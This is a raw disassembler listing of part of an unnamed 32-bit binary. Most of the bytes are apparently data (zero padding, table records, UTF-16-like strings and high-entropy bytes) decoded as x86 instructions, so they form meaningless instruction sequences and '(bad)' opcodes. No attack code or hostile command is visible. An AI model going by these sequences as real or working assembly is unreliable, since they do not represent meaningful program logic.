  410ee4:	add    BYTE PTR [eax],al
  410ee6:	add    BYTE PTR [eax],al
  410ee8:	add    DWORD PTR [eax],eax
  410eea:	or     DWORD PTR [eax+eax*1],eax
  410eed:	add    al,dh
  410eef:	push   es
  410ef0:	add    BYTE PTR [eax],al
  410ef2:	ret    0x113
  410ef5:	add    BYTE PTR [esi],dl
  410ef7:	or     DWORD PTR [eax],eax
  410ef9:	add    ah,ah
  410efb:	add    al,0x0
  410efd:	add    BYTE PTR [eax],al
  410eff:	add    BYTE PTR [eax],al
  410f01:	add    al,bl
  410f03:	sbb    al,0x1
  410f05:	add    BYTE PTR [esi],cl
  410f07:	or     DWORD PTR [eax],eax
  410f09:	add    ah,ah
  410f0b:	add    al,0x0
  410f0d:	add    BYTE PTR [eax],al
  410f0f:	add    BYTE PTR [eax],al
  410f11:	add    dh,ah
  410f13:	and    eax,0x90a0001
  410f18:	add    BYTE PTR [eax],al
  410f1a:	in     al,0x4
  410f1c:	add    BYTE PTR [eax],al
  410f1e:	add    BYTE PTR [eax],al
  410f20:	add    BYTE PTR [eax],al
  410f22:	lock add DWORD PTR cs:[eax],eax
  410f26:	sbb    cl,BYTE PTR [ecx]
  410f28:	add    BYTE PTR [eax],al
  410f2a:	in     al,0x4
  410f2c:	add    BYTE PTR [eax],al
  410f2e:	add    BYTE PTR [eax],al
  410f30:	add    BYTE PTR [eax],al
  410f32:	or     bh,BYTE PTR [eax]
  410f34:	add    DWORD PTR [eax],eax
  410f36:	push   cs
  410f37:	or     DWORD PTR [eax],eax
  410f39:	add    ah,ah
  410f3b:	add    al,0x0
  410f3d:	add    BYTE PTR [eax],al
  410f3f:	add    BYTE PTR [eax],al
  410f41:	add    BYTE PTR [eax],bl
  410f43:	inc    ecx
  410f44:	add    DWORD PTR [eax],eax
  410f46:	push   cs
  410f47:	or     DWORD PTR [eax],eax
  410f49:	add    ah,ah
  410f4b:	add    al,0x0
  410f4d:	add    BYTE PTR [eax],al
  410f4f:	add    BYTE PTR [eax],al
  410f51:	add    BYTE PTR [esi],ah
  410f53:	dec    edx
  410f54:	add    DWORD PTR [eax],eax
  410f56:	push   cs
  410f57:	or     DWORD PTR [eax],eax
  410f59:	add    ah,ah
  410f5b:	add    al,0x0
  410f5d:	add    BYTE PTR [eax],al
  410f5f:	add    BYTE PTR [eax],al
  410f61:	add    BYTE PTR [ebx+edx*2],dh
  410f64:	add    DWORD PTR [eax],eax
  410f66:	or     cl,BYTE PTR [ecx]
  410f68:	add    BYTE PTR [eax],al
  410f6a:	in     al,0x4
  410f6c:	add    BYTE PTR [eax],al
  410f6e:	add    BYTE PTR [eax],al
  410f70:	add    BYTE PTR [eax],al
  410f72:	ds pop esp
  410f74:	add    DWORD PTR [eax],eax
  410f76:	or     cl,BYTE PTR [ecx]
  410f78:	add    BYTE PTR [eax],al
  410f7a:	in     al,0x4
  410f7c:	add    BYTE PTR [eax],al
  410f7e:	add    BYTE PTR [eax],al
  410f80:	add    BYTE PTR [eax],al
  410f82:	dec    eax
  410f83:	add    DWORD PTR gs:[eax],eax
  410f86:	push   cs
  410f87:	or     DWORD PTR [eax],eax
  410f89:	add    ah,ah
  410f8b:	add    al,0x0
  410f8d:	add    BYTE PTR [eax],al
  410f8f:	add    BYTE PTR [eax],al
  410f91:	add    BYTE PTR [esi+0x6e],dl
  410f94:	add    DWORD PTR [eax],eax
  410f96:	adc    cl,BYTE PTR [ecx]
  410f98:	add    BYTE PTR [eax],al
  410f9a:	in     al,0x4
  410f9c:	add    BYTE PTR [eax],al
  410f9e:	add    BYTE PTR [eax],al
  410fa0:	add    BYTE PTR [eax],al
  410fa2:	push   0x16000177
  410fa7:	or     DWORD PTR [eax],eax
  410fa9:	add    ah,ah
  410fab:	add    al,0x0
  410fad:	add    BYTE PTR [eax],al
  410faf:	add    BYTE PTR [eax],al
  410fb1:	add    BYTE PTR [esi-0x80],bh
  410fb4:	add    DWORD PTR [eax],eax
  410fb6:	push   cs
  410fb7:	or     DWORD PTR [eax],eax
  410fb9:	add    ah,ah
  410fbb:	add    al,0x0
  410fbd:	add    BYTE PTR [eax],al
  410fbf:	add    BYTE PTR [eax],al
  410fc1:	add    BYTE PTR [ecx+ecx*4+0x90e0001],cl
  410fc8:	add    BYTE PTR [eax],al
  410fca:	in     al,0x4
  410fcc:	add    BYTE PTR [eax],al
  410fce:	add    BYTE PTR [eax],al
  410fd0:	add    BYTE PTR [eax],al
  410fd2:	call   0x9:0xa000192
  410fd9:	add    ah,ah
  410fdb:	add    al,0x0
  410fdd:	add    BYTE PTR [eax],al
  410fdf:	add    BYTE PTR [eax],al
  410fe1:	add    BYTE PTR [ebx+ebx*4+0x9120001],ah
  410fe8:	add    BYTE PTR [eax],al
  410fea:	in     al,0x4
  410fec:	add    BYTE PTR [eax],al
  410fee:	add    BYTE PTR [eax],al
  410ff0:	add    BYTE PTR [eax],al
  410ff2:	mov    dh,0xa4
  410ff4:	add    DWORD PTR [eax],eax
  410ff6:	sbb    al,BYTE PTR [eax]
  410ff8:	add    BYTE PTR [eax],al
  410ffa:	in     al,0x4
  410ffc:	add    BYTE PTR [eax],al
  410ffe:	add    BYTE PTR [eax],al
  411000:	add    BYTE PTR [eax],al
  411002:	shl    BYTE PTR [ecx+eax*1+0x90e00],1
  411009:	add    ah,ah
  41100b:	add    al,0x0
  41100d:	add    BYTE PTR [eax],al
  41100f:	add    BYTE PTR [eax],al
  411011:	add    dh,bl
  411013:	lods   eax,DWORD PTR ds:[esi]
  411014:	add    DWORD PTR [eax],eax
  411016:	push   cs
  411017:	or     DWORD PTR [eax],eax
  411019:	add    ah,ah
  41101b:	add    al,0x0
  41101d:	add    BYTE PTR [eax],al
  41101f:	add    BYTE PTR [eax],al
  411021:	add    ah,ch
  411023:	mov    dh,0x1
  411025:	add    BYTE PTR [esi],dl
  411027:	or     DWORD PTR [eax],eax
  411029:	add    ah,ah
  41102b:	add    al,0x0
  41102d:	add    BYTE PTR [eax],al
  41102f:	add    BYTE PTR [eax],al
  411031:	add    BYTE PTR [edx],al
  411033:	rol    BYTE PTR [ecx],0x0
  411036:	or     cl,BYTE PTR [ecx]
  411038:	add    BYTE PTR [eax],al
  41103a:	in     al,0x4
  41103c:	add    BYTE PTR [eax],al
  41103e:	add    BYTE PTR [eax],al
  411040:	add    BYTE PTR [eax],al
  411042:	or     al,0xc9
  411044:	add    DWORD PTR [eax],eax
  411046:	adc    cl,BYTE PTR [ecx]
  411048:	add    BYTE PTR [eax],al
  41104a:	in     al,0x4
  41104c:	add    BYTE PTR [eax],al
  41104e:	add    BYTE PTR [eax],al
  411050:	add    BYTE PTR [eax],al
  411052:	push   ds
  411053:	rol    BYTE PTR [ecx],cl
  411055:	add    BYTE PTR [esi],cl
  411057:	or     DWORD PTR [eax],eax
  411059:	add    ah,ah
  41105b:	add    al,0x0
  41105d:	add    BYTE PTR [eax],al
  41105f:	add    BYTE PTR [eax],al
  411061:	add    BYTE PTR [ebx+ebx*8],ch
  411064:	add    DWORD PTR [eax],eax
  411066:	push   cs
  411067:	or     DWORD PTR [eax],eax
  411069:	add    ah,ah
  41106b:	add    al,0x0
  41106d:	add    BYTE PTR [eax],al
  41106f:	add    BYTE PTR [eax],al
  411071:	add    BYTE PTR [edx],bh
  411073:	in     al,0x1
  411075:	add    BYTE PTR [esi],dl
  411077:	or     DWORD PTR [eax],eax
  411079:	add    ah,ah
  41107b:	add    al,0x0
  41107d:	add    BYTE PTR [eax],al
  41107f:	add    BYTE PTR [eax],al
  411081:	add    BYTE PTR [eax-0x13],dl
  411084:	add    DWORD PTR [eax],eax
  411086:	adc    cl,BYTE PTR [ecx]
  411088:	add    BYTE PTR [eax],al
  41108a:	in     al,0x4
  41108c:	add    BYTE PTR [eax],al
  41108e:	add    BYTE PTR [eax],al
  411090:	add    BYTE PTR [eax],al
  411092:	(bad)  
  411093:	test   BYTE PTR [ecx],0x0
  411096:	push   cs
  411097:	or     DWORD PTR [eax],eax
  411099:	add    ah,ah
  41109b:	add    al,0x0
  41109d:	add    BYTE PTR [eax],al
  41109f:	add    BYTE PTR [eax],al
  4110a1:	add    BYTE PTR [eax-0x1],dh
  4110a4:	add    DWORD PTR [eax],eax
  4110a6:	push   ss
  4110a7:	or     DWORD PTR [eax],eax
  4110a9:	add    ah,ah
  4110ab:	add    al,0x0
  4110ad:	add    BYTE PTR [eax],al
  4110af:	add    BYTE PTR [eax],al
  4110b1:	add    BYTE PTR [esi+0xa000208],al
  4110b7:	or     DWORD PTR [eax],eax
  4110b9:	add    ah,ah
  4110bb:	add    al,0x0
  4110bd:	add    BYTE PTR [eax],al
  4110bf:	add    BYTE PTR [eax],al
  4110c1:	add    BYTE PTR [eax+0xe000211],dl
  4110c7:	or     DWORD PTR [eax],eax
  4110c9:	add    ah,ah
  4110cb:	add    al,0x0
  4110cd:	add    BYTE PTR [eax],al
  4110cf:	add    BYTE PTR [eax],al
  4110d1:	add    BYTE PTR ds:0x42004400,cl
  4110d7:	add    BYTE PTR [ebx+0x0],dl
  4110da:	pop    edi
  4110db:	add    BYTE PTR [eax],dh
  4110dd:	add    BYTE PTR [ebp+0x0],dl
  4110e0:	inc    esi
  4110e1:	add    BYTE PTR [eax+0x0],cl
  4110e4:	inc    ebx
  4110e5:	add    BYTE PTR [edi+0x0],bl
  4110e8:	aaa    
  4110e9:	add    BYTE PTR [ebx+0x0],cl
  4110ec:	xor    al,0x0
  4110ee:	or     BYTE PTR [eax],al
  4110f0:	push   ebx
  4110f1:	add    BYTE PTR [ebp+0x0],cl
  4110f4:	xor    DWORD PTR [eax],eax
  4110f6:	pop    edi
  4110f7:	add    BYTE PTR [ebp+0x0],al
  4110fa:	push   ebp
  4110fb:	add    BYTE PTR [edi],dh
  4110fd:	add    BYTE PTR [eax],dh
  4110ff:	add    BYTE PTR [edi],cl
  411101:	add    BYTE PTR [eax+eax*1+0x4f],al
  411105:	add    BYTE PTR [ecx+0x0],dl
  411108:	pop    edi
  411109:	add    BYTE PTR [eax+eax*1+0x32],cl
  41110d:	add    BYTE PTR ds:0x59003600,dh
  411113:	add    BYTE PTR [edi+0x0],bl
  411116:	cmp    DWORD PTR [eax],eax
  411118:	cmp    DWORD PTR [eax],eax
  41111a:	push   edx
  41111b:	add    BYTE PTR [ebx],dh
  41111d:	add    BYTE PTR [edx+0x0],dl
  411120:	or     DWORD PTR [eax],eax
  411122:	inc    edx
  411123:	add    BYTE PTR [eax],dh
  411125:	add    BYTE PTR [edx+0x0],bl
  411128:	xor    eax,0x5f003500
  41112d:	add    BYTE PTR ds:0x36004f00,dh
  411133:	add    BYTE PTR [ebx],cl
  411135:	add    BYTE PTR [eax+eax*1+0x32],al
  411139:	add    BYTE PTR [eax+0x0],dl
  41113c:	xor    eax,DWORD PTR [eax]
  41113e:	xor    eax,DWORD PTR [eax]
  411140:	add    BYTE PTR ss:[ecx],dh
  411143:	add    BYTE PTR [edx],dh
  411145:	add    BYTE PTR [edi+0x0],bl
  411148:	cmp    BYTE PTR [eax],al
  41114a:	inc    edx
  41114b:	add    BYTE PTR [ecx],cl
  41114d:	add    BYTE PTR [ebp+0x0],al
  411150:	push   esp
  411151:	add    BYTE PTR [edx+0x0],cl
  411154:	pop    edi
  411155:	add    BYTE PTR [ecx+0x0],dl
  411158:	xor    DWORD PTR [eax],eax
  41115a:	dec    ecx
  41115b:	add    BYTE PTR [eax+eax*1],dh
  41115e:	cmp    BYTE PTR [eax],al
  411160:	or     al,0x0
  411162:	push   ecx
  411163:	add    BYTE PTR [ebp+0x0],dl
  411166:	inc    ebx
  411167:	add    BYTE PTR [edi+0x0],bl
  41116a:	xor    eax,0x32004400
  41116f:	add    BYTE PTR [eax],dh
  411171:	add    BYTE PTR [edi+0x0],bl
  411174:	xor    al,BYTE PTR [eax]
  411176:	dec    ecx
  411177:	add    BYTE PTR [edi+0x0],dl
  41117a:	or     BYTE PTR [eax],al
  41117c:	inc    ebp
  41117d:	add    BYTE PTR [eax],bh
  41117f:	add    BYTE PTR [eax],bh
  411181:	add    BYTE PTR [edi+0x0],bl
  411184:	dec    ebx
  411185:	add    BYTE PTR [eax+0x0],cl
  411188:	push   eax
  411189:	add    BYTE PTR [ecx],bh
  41118b:	add    BYTE PTR [ebx],cl
  41118d:	add    BYTE PTR [edi+0x0],cl
  411190:	aaa    
  411191:	add    BYTE PTR [eax],dh
  411193:	add    BYTE PTR [edx],dh
  411195:	add    BYTE PTR [edi+0x0],bl
  411198:	cmp    DWORD PTR [eax],eax
  41119a:	cmp    BYTE PTR [eax],al
  41119c:	inc    edi
  41119d:	add    BYTE PTR [edi+0x0],bl
  4111a0:	xor    BYTE PTR [eax],al
  4111a2:	dec    ebp
  4111a3:	add    BYTE PTR [edi],cl
  4111a5:	add    BYTE PTR [esi+0x0],al
  4111a8:	inc    esp
  4111a9:	add    BYTE PTR ds:0x36003300,dh
  4111af:	add    BYTE PTR [edi+0x0],bl
  4111b2:	push   esi
  4111b3:	add    BYTE PTR [ebp+0x0],dl
  4111b6:	dec    ebp
  4111b7:	add    BYTE PTR [esi+0x0],al
  4111ba:	pop    edi
  4111bb:	add    BYTE PTR [ecx],dh
  4111bd:	add    BYTE PTR [edx+0x0],bl
  4111c0:	inc    edi
  4111c1:	add    BYTE PTR [ecx+0x0],bl
  4111c4:	or     BYTE PTR [eax],al
  4111c6:	push   eax
  4111c7:	add    BYTE PTR [eax],dh
  4111c9:	add    BYTE PTR [edx],dh
  4111cb:	add    BYTE PTR [ebx],dh
  4111cd:	add    BYTE PTR [edi+0x0],bl
  4111d0:	push   eax
  4111d1:	add    BYTE PTR [eax],bh
  4111d3:	add    BYTE PTR [ecx+0x0],dl
  4111d6:	or     al,0x0
  4111d8:	inc    esi
  4111d9:	add    BYTE PTR [edx+0x0],bl
  4111dc:	dec    esp
  4111dd:	add    BYTE PTR [edi+0x0],bl
  4111e0:	add    BYTE PTR ss:[ebx],dh
  4111e3:	add    BYTE PTR [edi+0x0],cl
  4111e6:	push   esi
  4111e7:	add    BYTE PTR [eax+eax*1],dh
  4111ea:	pop    edi
  4111eb:	add    BYTE PTR [eax],bh
  4111ed:	add    BYTE PTR [esi+0x0],cl
  4111f0:	or     BYTE PTR [eax],al
  4111f2:	dec    edi
  4111f3:	add    BYTE PTR [edx+0x0],dl
  4111f6:	push   esp
  4111f7:	add    BYTE PTR [edi+0x0],bl
  4111fa:	push   ebp
  4111fb:	add    BYTE PTR [edx],dh
  4111fd:	add    BYTE PTR [ecx+0x0],bl
  411200:	xor    eax,DWORD PTR [eax]
  411202:	push   cs
  411203:	add    BYTE PTR [eax+0x0],cl
  411206:	cmp    DWORD PTR [eax],eax
  411208:	dec    ebx
  411209:	add    BYTE PTR [edi+0x0],bl
  41120c:	xor    al,0x0
  41120e:	inc    ecx
  41120f:	add    BYTE PTR [ecx],bh
  411211:	add    BYTE PTR [esi+0x0],dl
  411214:	cmp    DWORD PTR [eax],eax
  411216:	pop    edi
  411217:	add    BYTE PTR [eax+0x0],cl
  41121a:	dec    ecx
  41121b:	add    BYTE PTR [eax+eax*1+0x58],al
  41121f:	add    BYTE PTR [eax],cl
  411221:	add    BYTE PTR [eax+0x0],dl
  411224:	dec    esi
  411225:	add    BYTE PTR [eax+0x0],cl
  411228:	pop    edi
  411229:	add    BYTE PTR [eax],dh
  41122b:	add    BYTE PTR [ecx+0x0],dl
  41122e:	xor    DWORD PTR [eax],eax
  411230:	dec    ebp
  411231:	add    BYTE PTR [eax+eax*1],cl
  411234:	dec    edx
  411235:	add    BYTE PTR [eax+0x0],dl
  411238:	push   ecx
  411239:	add    BYTE PTR [edi+0x0],bl
  41123c:	dec    ecx
  41123d:	add    BYTE PTR [eax+eax*1+0x48],al
  411241:	add    BYTE PTR [edx+0x0],cl
  411244:	pop    edi
  411245:	add    BYTE PTR [ebp+0x0],al
  411248:	inc    ebp
  411249:	add    BYTE PTR [eax],dh
  41124b:	add    BYTE PTR [edx],cl
  41124d:	add    BYTE PTR [ebx+0x0],cl
  411250:	xor    BYTE PTR [eax],al
  411252:	xor    eax,0x54005f00
  411257:	add    BYTE PTR ds:0x53005700,dh
  41125d:	add    BYTE PTR [ecx],bh
  41125f:	add    BYTE PTR [eax+eax*1+0xd],dl
  411263:	add    BYTE PTR [eax+eax*1+0x5a],al
  411267:	add    BYTE PTR [eax],bh
  411269:	add    BYTE PTR ds:0x30005f00,dh
  41126f:	add    BYTE PTR [ebp+0x0],cl
  411272:	inc    ebx
  411273:	add    BYTE PTR [eax+eax*1+0x30],cl
  411277:	add    BYTE PTR [edi+0x0],bl
  41127a:	dec    ecx
  41127b:	add    BYTE PTR [ebx+0x0],al
  41127e:	or     BYTE PTR [eax],al
  411280:	dec    esi
  411281:	add    BYTE PTR [ebp+0x0],al
  411284:	dec    ecx
  411285:	add    BYTE PTR [edi+0x0],bl
  411288:	dec    ecx
  411289:	add    BYTE PTR [edx+0x0],dl
  41128c:	xor    BYTE PTR [eax],al
  41128e:	pop    edx
  41128f:	add    BYTE PTR [ebx],cl
  411291:	add    BYTE PTR [esi+0x0],dl
  411294:	dec    edx
  411295:	add    BYTE PTR [eax+eax*1+0x5f],al
  411299:	add    BYTE PTR [eax+0x0],bl
  41129c:	cmp    BYTE PTR [eax],al
  41129e:	xor    al,0x0
  4112a0:	pop    edx
  4112a1:	add    BYTE PTR [ecx],bh
  4112a3:	add    BYTE PTR [esi],dh
  4112a5:	add    BYTE PTR ds:0x4c000800,dh
  4112ab:	add    BYTE PTR [eax+0x0],bl
  4112ae:	dec    esp
  4112af:	add    BYTE PTR [edi+0x0],bl
  4112b2:	push   eax
  4112b3:	add    BYTE PTR [edx+0x0],cl
  4112b6:	xor    eax,DWORD PTR [eax]
  4112b8:	inc    edi
  4112b9:	add    BYTE PTR [eax+eax*1],cl
  4112bc:	push   eax
  4112bd:	add    BYTE PTR [ebx],dh
  4112bf:	add    BYTE PTR [ebx+0x0],al
  4112c2:	pop    edi
  4112c3:	add    BYTE PTR [edx+0x0],bl
  4112c6:	xor    al,BYTE PTR [eax]
  4112c8:	inc    edi
  4112c9:	add    BYTE PTR [eax],bh
  4112cb:	add    BYTE PTR [edx+0x0],al
  4112ce:	pop    edi
  4112cf:	add    BYTE PTR [edx+0x0],cl
  4112d2:	pop    ecx
  4112d3:	add    BYTE PTR [edx],cl
  4112d5:	add    BYTE PTR [edi+0x0],al
  4112d8:	push   esi
  4112d9:	add    BYTE PTR [ebp+0x0],dl
  4112dc:	cmp    BYTE PTR [eax],al
  4112de:	xor    DWORD PTR [eax],eax
  4112e0:	add    BYTE PTR ss:[edi+0x0],bl
  4112e4:	pop    ecx
  4112e5:	add    BYTE PTR [edx+0x0],bl
  4112e8:	push   ebx
  4112e9:	add    BYTE PTR ds:0x42005100,cl
  4112ef:	add    BYTE PTR [ecx],bh
  4112f1:	add    BYTE PTR [edi+0x0],bl
  4112f4:	inc    ecx
  4112f5:	add    BYTE PTR [esi],dh
  4112f7:	add    BYTE PTR [ecx],bh
  4112f9:	add    BYTE PTR [esi+0x0],dl
  4112fc:	inc    esp
  4112fd:	add    BYTE PTR [edi+0x0],bl
  411300:	inc    ebp
  411301:	add    BYTE PTR [edi+0x0],dl
  411304:	add    BYTE PTR ss:[ecx],cl
  411307:	add    BYTE PTR [edx+0x0],bl
  41130a:	dec    esp
  41130b:	add    BYTE PTR [ecx],dh
  41130d:	add    BYTE PTR [edi+0x0],bl
  411310:	push   ecx
  411311:	add    BYTE PTR [eax+0x0],dl
  411314:	pop    eax
  411315:	add    BYTE PTR [edi+0x0],bl
  411318:	inc    ebp
  411319:	add    BYTE PTR ds:0x47005600,cl
  41131f:	add    BYTE PTR [edx],dh
  411321:	add    BYTE PTR [edi+0x0],bl
  411324:	push   esi
  411325:	add    BYTE PTR [edi+0x0],al
  411328:	inc    ebx
  411329:	add    BYTE PTR [edx+0x0],dl
  41132c:	dec    esi
  41132d:	add    BYTE PTR [edi+0x0],bl
  411330:	inc    edi
  411331:	add    BYTE PTR [eax+eax*1],dh
  411334:	xor    DWORD PTR [eax],eax
  411336:	push   cs
  411337:	add    BYTE PTR [esi+0x0],al
  41133a:	push   esp
  41133b:	add    BYTE PTR [edx+0x0],bl
  41133e:	pop    edi
  41133f:	add    BYTE PTR [edi+0x0],cl
  411342:	inc    edi
  411343:	add    BYTE PTR [ecx+0x0],cl
  411346:	dec    eax
  411347:	add    BYTE PTR [ebx+0x0],cl
  41134a:	pop    edi
  41134b:	add    BYTE PTR [ebx+0x0],cl
  41134e:	push   eax
  41134f:	add    BYTE PTR [edi+0x0],cl
  411352:	dec    esp
  411353:	add    BYTE PTR [eax],cl
  411355:	add    BYTE PTR [eax+0x0],bl
  411358:	push   esi
  411359:	add    BYTE PTR [ebx],dh
  41135b:	add    BYTE PTR [edx],dh
  41135d:	add    BYTE PTR [eax],dh
  41135f:	add    BYTE PTR [eax],dh
  411361:	add    BYTE PTR [eax],bh
  411363:	add    BYTE PTR [edi+0x0],cl
  411366:	push   cs
  411367:	add    BYTE PTR [ecx+0x0],al
  41136a:	inc    ebx
  41136b:	add    BYTE PTR [ecx+0x0],al
  41136e:	cmp    BYTE PTR [eax],al
  411370:	pop    edi
  411371:	add    BYTE PTR [esi+0x0],dl
  411374:	pop    eax
  411375:	add    BYTE PTR [eax],bh
  411377:	add    BYTE PTR [edi+0x0],bl
  41137a:	inc    ebx
  41137b:	add    BYTE PTR [ebp+0x0],al
  41137e:	pop    eax
  41137f:	add    BYTE PTR [eax+eax*1],dh
  411382:	aaa    
  411383:	add    BYTE PTR [eax+eax*1],cl
  411386:	pop    ecx
  411387:	add    BYTE PTR [esi+0x0],cl
  41138a:	push   ecx
  41138b:	add    BYTE PTR [edi+0x0],bl
  41138e:	push   edi
  41138f:	add    BYTE PTR [edx],dh
  411391:	add    BYTE PTR [edi+0x0],al
  411394:	xor    al,BYTE PTR [eax]
  411396:	xor    BYTE PTR [eax],al
  411398:	pop    edi
  411399:	add    BYTE PTR [eax+eax*1+0x47],cl
  41139d:	add    BYTE PTR [edi],cl
  41139f:	add    BYTE PTR [ecx+0x0],al
  4113a2:	cmp    BYTE PTR [eax],al
  4113a4:	push   ecx
  4113a5:	add    BYTE PTR [edi+0x0],bl
  4113a8:	xor    al,0x0
  4113aa:	xor    BYTE PTR [eax],al
  4113ac:	dec    esi
  4113ad:	add    BYTE PTR [ecx+0x0],al
  4113b0:	cmp    BYTE PTR [eax],al
  4113b2:	pop    edi
  4113b3:	add    BYTE PTR ds:0x53004e00,dh
  4113b9:	add    BYTE PTR [ebp+0x0],al
  4113bc:	cmp    BYTE PTR [eax],al
  4113be:	add    BYTE PTR [eax],al
  4113c0:	add    BYTE PTR [eax],al
  4113c2:	pop    ebp
  4113c3:	add    DWORD PTR [edx+0x7debdeea],0x4880e6b7
  4113cd:	sar    BYTE PTR ds:0xc3a07a65,cl
  4113d3:	pop    edx
  4113d4:	add    DWORD PTR [eax],eax
  4113d6:	and    al,BYTE PTR [edi]
  4113d8:	add    BYTE PTR [eax],al
  4113da:	aaa    
  4113db:	ins    BYTE PTR es:[edi],dx
  4113dc:	aas    
  4113dd:	or     al,0x7c
  4113df:	xchg   ebx,eax
  4113e0:	pusha  
  4113e1:	xchg   edi,eax
  4113e2:	retf   
  4113e3:	lods   al,BYTE PTR ds:[esi]
  4113e4:	mov    ebp,0xb13ace07
  4113e9:	popf   
  4113ea:	int3   
  4113eb:	xor    eax,0xe1bdbdf
  4113f0:	fsubr  QWORD PTR [ebx+0x4f]
  4113f3:	xchg   edi,eax
  4113f4:	add    ebp,ebx
  4113f6:	loopne 0x411438
  4113f8:	jp     0x4113ed
  4113fa:	rcr    ebp,0xd0
  4113fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113fe:	mov    ebp,0xa62f430a
  411403:	scas   al,BYTE PTR es:[edi]
  411404:	adc    esp,ebx
  411406:	dec    ecx
  411407:	fld    DWORD PTR [ebx-0x33]
  41140a:	jg     0x4113a9
  41140c:	jmp    0x3adb:0x6006c351
  411413:	pop    esi
  411414:	sub    DWORD PTR ds:0x8c6c8f8e,ecx
  41141a:	daa    
  41141b:	mov    al,gs:0x3ef16a3
  411421:	stc    
  411422:	mov    ebp,0x71a3699a
  411427:	stos   DWORD PTR es:[edi],eax
  411428:	and    al,0x99
  41142a:	(bad)  
  41142b:	iret   
  41142c:	jmp    0x4113f1
  41142e:	mov    cl,0x3b
  411430:	imul   BYTE PTR [edi-0x6fdd8a6f]
  411436:	fdivr  st,st(5)
  411438:	inc    esi
  411439:	(bad)  
  41143a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41143b:	pop    ebx
  41143c:	dec    edx
  41143d:	adc    ebp,DWORD PTR [ebx-0x15035739]
  411443:	sbb    al,0x87
  411445:	icebp  
  411446:	ss pop ecx
  411448:	fs push es
  41144a:	xchg   ebx,eax
  41144b:	repz in al,0x17
  41144e:	mov    WORD PTR [ecx-0x59cd2d02],es
  411454:	les    eax,FWORD PTR [edi+0x431ac279]
  41145a:	inc    ebp
  41145b:	xchg   ebx,eax
  41145c:	or     eax,0x1dd10820
  411461:	(bad)
  411465:	adc    eax,DWORD PTR [edi+0x39]
  411468:	cmp    ah,BYTE PTR [esi+ebp*8+0x75]
  41146c:	pop    es
  41146d:	xbegin 0x3758db98
  411473:	xchg   ebx,eax
  411474:	push   esi
  411475:	out    0xf0,al
  411477:	pop    eax
  411478:	scas   eax,DWORD PTR es:[edi]
  411479:	sub    DWORD PTR [ebx-0x44],ebx
  41147c:	xor    al,0xb8
  41147e:	mov    BYTE PTR [edi+ecx*8-0x51],ch
  411482:	pusha  
  411483:	fs push ebx
  411485:	xchg   ebp,eax
  411486:	test   eax,0x3e2b9be1
  41148b:	mov    esp,0x2f454053
  411490:	jp     0x4114d5
  411492:	sub    eax,0xeb2ad47b
  411497:	mov    dl,0xb
  411499:	inc    eax
  41149a:	pop    edi
  41149b:	pusha  
  41149c:	int3   
  41149d:	aaa    
  41149e:	jle    0x4114e9
  4114a0:	add    esi,DWORD PTR [edx]
  4114a2:	fwait
  4114a3:	ja     0x4114f3
  4114a5:	out    dx,al
  4114a6:	sub    DWORD PTR [ecx+0x85a8203],edi
  4114ac:	scas   eax,DWORD PTR es:[edi]
  4114ad:	pop    ebp
  4114ae:	jmp    0x41148a
  4114b0:	jmp    0x97b:0xe65700c6
  4114b7:	inc    esp
  4114b8:	ins    DWORD PTR es:[edi],dx
  4114b9:	adc    al,0x8d
  4114bb:	add    eax,0x1751fa6b
  4114c0:	jbe    0x4114d2
  4114c2:	pop    esi
  4114c3:	mov    bl,0x1c
  4114c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114c6:	jecxz  0x411519
  4114c8:	mov    eax,ds:0xdd77d723
  4114cd:	pop    esi
  4114ce:	jmp    0x5ca70d1
  4114d3:	(bad)  
  4114d4:	fdivr  QWORD PTR fs:[eax+0x58e525e3]
  4114db:	mov    BYTE PTR [ebx+0x1b6edf9d],dl
  4114e1:	and    eax,DWORD PTR [ecx+edi*2-0x5a]
  4114e5:	sti    
  4114e6:	inc    ebp
  4114e7:	and    al,BYTE PTR [edx+0x48]
  4114ea:	jmp    FWORD PTR [ecx]
  4114ec:	pop    ebx
  4114ed:	fild   DWORD PTR [edx-0x4a713755]
  4114f3:	add    al,0x3e
  4114f5:	(bad)  
  4114f7:	sub    eax,0xe7e76f9f
  4114fc:	imul   edx,DWORD PTR [edx+0x3a77be1e],0xaa6fb6ef
  411506:	xor    edi,0xce0b8cbc
  41150c:	mov    dl,BYTE PTR [ecx+0xa]
  41150f:	xchg   edx,eax
  411510:	inc    ecx
  411511:	pusha  
  411512:	lahf   
  411513:	push   0x1bc84ff7
  411518:	pop    ecx
  411519:	rcr    DWORD PTR [ebx],cl
  41151b:	repnz into 
  41151d:	jmp    0x6de7:0x51529079
  411524:	and    al,0xcd
  411526:	push   0x9c96ab7e
  41152b:	inc    edx
  41152c:	dec    edx
  41152d:	test   eax,0xfe50f6e1
  411532:	mov    DWORD PTR [edi],edi
  411534:	sti    
  411535:	pop    ebp
  411536:	sub    BYTE PTR [ebx],bh
  411538:	imul   edi,DWORD PTR [ebp-0x2a],0x16
  41153c:	mov    cl,0x84
  41153e:	adc    BYTE PTR [ebx-0x7f],0x95
  411542:	sbb    ebx,DWORD PTR [ebx-0x39]
  411545:	sub    eax,0x2f2c5738
  41154a:	icebp  
  41154b:	test   eax,0x93f3d3f9
  411550:	xchg   edi,eax
  411551:	sbb    al,0x16
  411553:	scas   eax,DWORD PTR es:[edi]
  411554:	into   
  411555:	or     eax,0xc189a2ef
  41155a:	xor    DWORD PTR [ecx],ecx
  41155c:	mov    dl,0xb
  41155e:	int3   
  41155f:	or     ebp,ebx
  411561:	jno    0x411571
  411563:	mov    dh,0x63
  411565:	and    ebp,DWORD PTR ss:[edx+0x74d650]
  41156c:	sbb    dh,BYTE PTR [ebp+0x5b63a8a3]
  411572:	stos   DWORD PTR es:[edi],eax
  411573:	js     0x4115e4
  411575:	cli    
  411576:	loop   0x41158b
  411578:	sub    ch,BYTE PTR [ecx-0xc4b45f2]
  41157e:	xchg   ecx,eax
  41157f:	xchg   BYTE PTR [eax+edx*8+0x4],ch
  411583:	das    
  411584:	(bad)  
  411586:	lea    esp,ds:0x576
  41158b:	sub    ecx,DWORD PTR [edx-0x2c]
  41158e:	sbb    eax,0x8d5ac930
  411593:	add    al,0x3b
  411595:	mov    esi,0x3eb10d15
  41159b:	xchg   ebx,eax
  41159c:	ret    
  41159d:	or     DWORD PTR [ecx+0x18bb752f],esp
  4115a3:	or     al,0xe1
  4115a5:	fucom  st(5)
  4115a7:	in     eax,dx
